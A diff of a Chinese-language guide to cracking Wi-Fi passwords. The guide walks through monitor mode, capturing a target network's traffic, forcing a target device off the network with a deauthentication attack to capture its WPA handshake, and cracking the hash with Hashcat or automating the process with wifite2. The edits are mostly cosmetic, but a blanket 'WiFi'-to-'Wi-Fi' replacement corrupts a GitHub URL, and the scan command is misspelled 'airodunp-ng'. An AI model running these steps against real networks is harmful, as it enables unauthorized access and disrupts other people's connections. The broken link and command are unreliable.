@@ -25,33 +25,33 @@
     !!! warning
         監聽模式開啓後的無線網卡將無法訪問 Internet, 直到監聽模式被關閉.
 
-3. 監聽 WiFi 信號.
+3. 監聽 Wi-Fi 信號.
 
     ```sh
     sudo airodunp-ng wlan0mon
     ```
 
-    當發現目標 WiFi 時按`Ctrl+C`停止掃描. 並記錄 BSSID 和 CH 兩個參數.
+    當發現目標 Wi-Fi 時按`Ctrl+C`停止掃描. 並記錄 BSSID 和 CH 兩個參數.
 
-4. 捕獲指定 WiFi 通信內容.
+4. 捕獲指定 Wi-Fi 通信內容.
 
     ```sh
     sudo airodump-ng -w [.cap存檔名稱] -c [CH] --bssid  [BSSID] wlan0mon
     ```
 
-5. 斷開指定設備與指定 WiFi 的鏈接.
+5. 斷開指定設備與指定 Wi-Fi 的鏈接.
 
     ```sh
     sudo aireplay-ng -0 5 -a [BSSID] -c [Target MAC] wlan0mon
     ```
 
-    目標設備從指定 WiFi 斷開鏈接後將嘗試重連, 會向路由器發送握手包. 而第 4 步將會捕獲這個握手包.
+    目標設備從指定 Wi-Fi 斷開鏈接後將嘗試重連, 會向路由器發送握手包. 而第 4 步將會捕獲這個握手包.
 
 6. 當第 4 步提示捕獲握手包時按下 `Ctrl+C` 結束監聽.
 
     此時, 握手包的數據已經被記錄在第4步指定的 `.cap` 文件中.
 
-7. 對 `.cap` 文件中握手包的hash進行破解.
+7. 對 `.cap` 文件中握手包的 hash 進行破解.
 
     - 使用 Hashcat. (推薦)
 
@@ -76,6 +76,6 @@
 
 ## 自动
 
-可以利用 [wifite2](https://github.com/derv82/wifite2)/[WEF](https://github.com/D3Ext/WEF) 来简化上面的流程.  
+可以利用 [Wi-Fite2](https://github.com/derv82/Wi-Fite2)/[WEF](https://github.com/D3Ext/WEF) 来简化上面的流程.  
 
-![Wifite2 WAP Handshake attack](https://camo.githubusercontent.com/241679fd57d09ce160bbaf04886b896d1d101d405fc4d692954beefc8e477a07/68747470733a2f2f692e696d6775722e636f6d2f4636565068626d2e676966)
+![Wi-Fite2 WAP Handshake attack](https://camo.githubusercontent.com/241679fd57d09ce160bbaf04886b896d1d101d405fc4d692954beefc8e477a07/68747470733a2f2f692e696d6775722e636f6d2f4636565068626d2e676966)
